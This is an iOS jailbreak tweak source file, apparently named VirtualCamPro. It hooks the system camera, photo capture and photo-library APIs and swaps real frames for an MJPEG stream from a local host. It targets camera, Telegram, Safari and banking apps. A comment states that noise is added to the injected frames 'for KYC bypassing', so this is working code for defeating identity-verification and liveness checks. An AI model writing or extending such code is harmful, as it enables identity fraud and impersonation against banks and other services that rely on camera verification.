// Tweak.x - VirtualCamPro V270.0: Core Sovereign Pro
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <Photos/Photos.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import "MJPEGStreamReader.h"

static BOOL enabled = YES;
static NSString *streamURL = @"http://192.168.1.44:8889/live/stream";
static MJPEGStreamReader *gReader = nil;
static UIImage *gLastFrame = nil;

// Helper to add a tiny bit of noise for KYC bypassing
static UIImage *AddStealthNoise(UIImage *img) {
    if (!img) return nil;
    UIGraphicsBeginImageContextWithOptions(img.size, YES, img.scale);
    [img drawAtPoint:CGPointZero];
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetFillColorWithColor(context, [[UIColor whiteColor] colorWithAlphaComponent:0.01].CGColor);
    for (int i = 0; i < 50; i++) {
        CGRect rect = CGRectMake(arc4random_uniform(img.size.width), arc4random_uniform(img.size.height), 1, 1);
        CGContextFillRect(context, rect);
    }
    UIImage *noisyImg = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return noisyImg;
}

static CMSampleBufferRef CreateFakeBuffer(UIImage *img) {
    if (!img) return NULL;
    CGImageRef cg = img.CGImage;
    CVPixelBufferRef px = NULL;
    CVReturn s = CVPixelBufferCreate(kCFAllocatorDefault, CGImageGetWidth(cg), CGImageGetHeight(cg), kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)@{ (id)kCVPixelBufferCGImageCompatibilityKey: @YES }, &px);
    if (s != kCVReturnSuccess) return NULL;

    CMVideoFormatDescriptionRef vdesc = NULL;
    CMVideoFormatDescriptionCreateForImageBuffer(nil, px, &vdesc);
    CMSampleTimingInfo t = { kCMTimeInvalid, kCMTimeZero, kCMTimeInvalid };
    CMSampleBufferRef sb = NULL;
    CMSampleBufferCreateForImageBuffer(nil, px, YES, nil, nil, vdesc, &t, &sb);
    
    CFRelease(px);
    if (vdesc) CFRelease(vdesc);
    return sb;
}

// 1. System-wide Data Hijack
%hook AVCaptureVideoDataOutput
- (void)captureOutput:(AVCaptureOutput *)o didOutputSampleBuffer:(CMSampleBufferRef)s fromConnection:(AVCaptureConnection *)c {
    if (enabled && gLastFrame) {
        CMSampleBufferRef fake = CreateFakeBuffer(gLastFrame);
        if (fake) {
            %orig(o, fake, c);
            CFRelease(fake);
            return;
        }
    }
    %orig;
}
%end

// 2. Photo & Metadata Hijack
%hook AVCapturePhoto
- (NSData *)fileDataRepresentation {
    if (enabled && gLastFrame) {
        UIImage *noisy = AddStealthNoise(gLastFrame);
        return UIImageJPEGRepresentation(noisy ?: gLastFrame, 0.96);
    }
    return %orig;
}
- (CGImageRef)CGImageRepresentation {
    if (enabled && gLastFrame) return gLastFrame.CGImage;
    return %orig;
}
%end

// 3. UI & Gallery Picker Hijack (The Fix for Thumbnails)
%hook PHImageManager
- (PHImageRequestID)requestImageForAsset:(PHAsset *)asset targetSize:(CGSize)size contentMode:(PHImageContentMode)contentMode options:(PHImageRequestOptions *)options resultHandler:(void (^)(UIImage *result, NSDictionary *info))resultHandler {
    if (enabled && gLastFrame && [asset.creationDate timeIntervalSinceNow] > -60) {
        resultHandler(gLastFrame, nil);
        return 0;
    }
    return %orig;
}
%end

%hook AVCaptureVideoPreviewLayer
- (void)layoutSublayers {
    %orig;
    if (enabled) {
        self.opacity = 0.0;
        UIView *p = (UIView *)self.delegate;
        if ([p isKindOfClass:[UIView class]]) {
            UIImageView *v = [p viewWithTag:9999];
            if (!v) {
                v = [[UIImageView alloc] initWithFrame:p.bounds];
                v.tag = 9999;
                v.contentMode = UIViewContentModeScaleAspectFill;
                v.backgroundColor = [UIColor blackColor];
                [p insertSubview:v atIndex:0];
            }
            if (gLastFrame) v.image = gLastFrame;
        }
    }
}
%end

%ctor {
    NSString *bid = [NSBundle mainBundle].bundleIdentifier;
    if ([bid containsString:@"camera"] || [bid containsString:@"telegra"] || [bid containsString:@"safari"] || [bid containsString:@"bank"]) {
        gReader = [[MJPEGStreamReader alloc] initWithURL:[NSURL URLWithString:streamURL]];
        gReader.frameCallback = ^(UIImage *f) { gLastFrame = f; };
        [gReader startStreaming];
    }
}
